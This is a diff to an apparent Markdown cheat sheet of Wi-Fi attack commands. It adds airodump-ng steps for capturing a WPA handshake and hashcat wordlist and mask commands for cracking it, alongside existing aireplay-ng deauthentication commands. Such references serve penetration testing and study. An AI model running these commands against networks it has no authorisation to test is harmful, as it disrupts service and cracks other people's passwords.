@@ -26,12 +26,20 @@
 * `macchanger -r wlan1` : Change mac address to random
 * `ifconfig wlan1 down` : Bring the interface up
 
+
+## Capturig Handshake file
+* `airodump-ng -bssid [bssid] --channel [1] --write Desktop/Captures/WPA wlan0mon`
+
 ## Deauth Attacks
 
 * `airodump-ng --channel --bssid  wlan1mon`
 * `aireplay-ng --deauth 2000 -a [MAC of Access Point] [MAC of  Client] wlan1mon`
 
-
+## Cracking Handshake file with Hashcat (Windows)
+* `hashcat64.exe -m 2500 capture.hccap wordlist.lst`
+Keyspace attack
+* `hashcat64.exe -m 2500 -a3 capture.hccap -1 1234567890 ?1?1?1?1?1?1?1?1
+* `hashcat64.exe -m 2500 -a3 capture.hccap -1 ?d?d?d?d?d?d?d?d`
 
 
 
